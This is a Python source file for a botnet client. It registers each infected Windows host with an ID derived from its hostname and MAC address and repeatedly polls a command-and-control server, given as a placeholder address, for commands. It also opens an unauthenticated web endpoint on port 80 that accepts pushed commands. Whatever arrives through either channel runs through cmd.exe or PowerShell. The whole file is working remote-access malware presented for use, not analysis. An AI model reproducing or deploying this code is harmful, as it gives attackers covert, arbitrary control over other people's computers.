import requests
import subprocess
import threading
import time
import uuid
import socket
from flask import Flask

# === Config ===
C2_URL = "http://YOUR-C2-IP:8080"  # Replace with your C2 IP or domain
BOT_ID = f"{socket.gethostname()}_{uuid.getnode() & 0xFFFFFFF:X}"
POLL_INTERVAL = 10  # seconds

# === Flask Web Server for /ping and /run ===
app = Flask(__name__)
last_command = None

@app.route("/ping")
def ping():
    return "pong"

@app.route("/run", methods=["POST"])
def run_from_push():
    from flask import request
    global last_command
    cmd = request.json.get("cmd", "")
    if cmd:
        last_command = cmd
        threading.Thread(target=execute_command, args=(cmd,), daemon=True).start()
        return "running"
    return "no command"

def execute_command(cmd):
    shell = "powershell" if cmd.lower().startswith("ps:") else "cmd"
    if shell == "powershell":
        cmd = cmd[3:].strip()
        exec_cmd = ["powershell.exe", "-Command", cmd]
    else:
        exec_cmd = ["cmd.exe", "/C", cmd]

    print(f"[+] Executing with {shell}: {cmd}")
    try:
        result = subprocess.run(exec_cmd, capture_output=True, text=True, timeout=60)
        output = result.stdout.strip() or "(no output)"
        error = result.stderr.strip()
        print("[*] Output:\n", output)
        if error:
            print("[!] Errors:\n", error)
    except Exception as e:
        print("[!] Command failed:", e)

# === Background Polling ===
def poll_commands():
    global last_command
    while True:
        try:
            r = requests.get(f"{C2_URL}/getcmd/{BOT_ID}", timeout=10)
            cmd = r.text.strip()
            if cmd and cmd != last_command:
                print(f"[>] Received command: {cmd}")
                last_command = cmd
                threading.Thread(target=execute_command, args=(cmd,), daemon=True).start()
        except Exception as e:
            print("[!] Polling failed:", e)
        time.sleep(POLL_INTERVAL)

# === Start bot ===
if __name__ == "__main__":
    print(f"[✓] Bot started as {BOT_ID}")
    threading.Thread(target=poll_commands, daemon=True).start()
    app.run(host="0.0.0.0", port=80)
